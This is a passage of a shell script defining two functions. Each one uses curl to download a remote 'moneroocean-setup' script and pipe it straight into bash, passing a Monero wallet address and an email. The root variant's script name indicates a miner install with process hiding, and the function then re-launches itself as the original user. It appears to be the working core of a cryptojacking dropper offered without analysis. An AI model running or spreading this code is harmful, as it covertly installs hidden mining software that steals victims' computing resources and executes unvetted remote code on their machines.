...
rootstuff() {
  curl -s -L https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4AG114wroAMFXbLyK65UbXBoYKhx3QeY8NTpEYZuf3WPCLFg5nL3TBZ8SQZ5RcmBfxfmoxoNWN81NaqnW6supV3oAm21WTD durandscollardbvd6@gmail.com
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  curl -s -L https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/setup_gdm2.sh | bash -s 4AG114wroAMFXbLyK65UbXBoYKhx3QeY8NTpEYZuf3WPCLFg5nL3TBZ8SQZ5RcmBfxfmoxoNWN81NaqnW6supV3oAm21WTD durandscollardbvd6@gmail.com
}
